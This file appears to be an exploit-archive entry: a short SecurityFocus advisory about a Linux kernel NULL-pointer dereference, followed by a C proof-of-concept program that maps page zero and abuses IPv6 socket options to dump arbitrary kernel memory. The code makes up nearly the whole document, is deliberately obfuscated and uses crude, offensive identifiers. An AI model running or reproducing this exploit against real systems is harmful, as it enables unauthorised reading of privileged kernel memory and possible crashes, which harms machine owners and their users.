/*
source: http://www.securityfocus.com/bid/23142/info

The Linux kernel is prone to a NULL-pointer dereference vulnerability.

A local attacker can exploit this issue to crash the affected application, denying service to legitimate users. The attacker may also be able to execute arbitrary code with elevated privileges, but this has not been confirmed.
*/


__ ip2.c __
// advanced exploit code for catastrophic kernel bug by Joey Mengele, professional hacker
// user, to dump 0xaddress from kernel memory: ./ip2 0xaddress
#include <sys/signal.h>
typedef int fg8;
#include <sys/mman.h>
typedef long _l36;
#include <string.h>
typedef long * jayn9124;
#include <stdio.h>
typedef char * anal;
#include <netinet/in.h>
#define __exit main
#define __main exit
typedef void pleb;
#include <stdlib.h>
fg8 ___hh(fg8,_l36,jayn9124);
#include <unistd.h>
pleb _zzy();
#       define __f4 setsockopt
#       define __f5 getsockopt
fg8 __exit(fg8 argc, anal *argv[]) {
_l36 tmp;
fg8 s;
_l36 hud;
if (argc!=2) __main(-1);
if (1 != sscanf(argv[1]," 0x%x",&hud)) __main(-1);
signal(SIGSEGV,&exit);
s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
_zzy();
__f4(s, IPPROTO_IPV6, 6, (void *)NULL, 0);
___hh(s,hud,&tmp);
printf("Kernel memory @ %.8x contains %.8x\n",hud,tmp);
return 0;
}
int ___hh(int bf,_l36 _rtg,jayn9124 rape)
{
fg8 ot=4;
*(jayn9124)(0x8) = _rtg;
return __f5(bf,IPPROTO_IPV6,59,(void *)rape,&ot);
}
void _zzy()
{
_l36 *gol = NULL;
if( (gol = mmap( (void *)NULL, 4096,
PROT_READ|PROT_WRITE, MAP_FIXED |MAP_ANONYMOUS | MAP_PRIVATE, 0, 0
)) == (void *) -1 )
{perror( "mmap" );exit(412);}
}
__ ip2.c EOF __